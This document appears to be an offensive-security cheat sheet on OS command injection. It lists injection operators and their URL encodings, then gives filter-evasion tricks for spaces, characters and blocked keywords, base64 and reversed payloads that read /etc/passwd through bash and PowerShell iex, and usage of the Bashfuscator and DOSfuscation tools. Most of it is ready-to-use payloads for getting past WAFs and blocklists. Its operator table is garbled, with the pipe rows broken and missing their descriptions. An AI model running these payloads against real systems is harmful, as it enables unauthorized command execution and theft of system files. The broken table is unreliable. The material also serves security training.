# Command Injections
## 1. Detection & Basics
The first step is identifying if an input field interacts with the underlying operating system.
### Identification
- **Behavioral Analysis:** Look for inputs that return system-like output (e.g., `ping` statistics, `nslookup` results).
- **Verification:** Inject a benign payload like `127.0.0.1` to confirm standard functionality. If the output looks like a shell command result, injection is possible.
### Injection Operators
To append a new command to the existing one, use shell operators.

| **Operator** | **URL Encoded** | **Description**                                                   |
| -------- | ----------- | ------------------------------------------------------------- |
| `;`      | `%3b`       | Executes the first command, then the second.                  |
| `\n`     | `%0a`       | Newline character; executes both commands.                    |
| `&`      | `%26`       | Background execution; executes both commands.                 |
| `        | `           | `%7c`                                                         |
| `&&`     | `%26%26`    | AND; executes the second command only if the first succeeds.  |
| `        |             | `                                                             |
| `` ` ``  | `%60`       | Sub-shell (Linux). Executes command inside backticks first.   |
| `$()`    | `%24%28%29` | Sub-shell (Linux). Executes command inside parentheses first. |

**Example Payload:**
```shell
# Valid Input + Operator + Malicious Command
127.0.0.1; whoami
```
## 2. Filter Evasion & Bypass
Modern applications often employ filters (WAFs or code-level blocklists) to strip dangerous characters or commands.
### Space Filtering
If the space character is blocked, use these alternatives:
- **Tabs:** `%09`
- **Linux Environment Variables:** `${IFS}` (Internal Field Separator, defaults to space/tab/newline).
- **Brace Expansion (Bash):** `{ls,-la}`
### Character Filtering
If specific characters (like `/` or `;`) are blocked:
- **Environment Slicing (Linux):** `${PATH:0:1}` produces `/`. `${LS_COLORS:10:1}` produces `;`.
- **Windows Slicing:** `%HOMEPATH:~0,-11%` extracts specific characters from Windows variables.
- **Character Shifting:** Use `tr` to shift ASCII characters (e.g., shift `[` to `\`).
### Blacklisted Commands
If keywords like `whoami` or `cat` are blocked:
- **Quotes (Linux/Windows):** Insert quotes to break up the string. `w'h'o'am'i` or `w"h"o"am"i`.
- **Wildcards (Linux):** `cat /etc/passwd` -> `/bin/c?? /?tc/p??swd`.
- **Backslashes (Linux):** `w\ho\am\i`.
- **Positional Parameters (Linux):** `who$@ami`.
- **Carets (Windows):** `who^ami`.
## 3. Advanced Obfuscation
When simple bypasses fail, use encoding or logic reversal to hide the payload completely.
### Case Manipulation
- **Windows:** `WhOaMi` (PowerShell/CMD are case-insensitive).
- **Linux:** Use `tr` to handle case.
```shell
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
### Reversed Commands
Write the command backwards and reverse it at runtime.

- **Linux:**
```shell
$(rev<<<'imaohw')
```
- **Windows:**
```powershell
iex "$('imaohw'[-1..-20] -join '')"
```
### Encoded Commands (Base64)
Encode the payload to avoid all special characters.

- **Linux:**
```shell
# Payload: cat /etc/passwd | grep 33
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
- **Windows:**
```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
## 4. Automated Evasion Tools
Tools can automate the generation of obfuscated payloads.
### Linux: Bashfuscator
A modular framework to obfuscate Bash scripts.
```shell
git clone https://github.com/Bashfuscator/Bashfuscator
python3 setup.py install --user
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```
### Windows: DOSfuscation
An interactive framework for obfuscating CMD commands.
```powershell
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
SET COMMAND type C:\Windows\System32\drivers\etc\hosts
encoding
```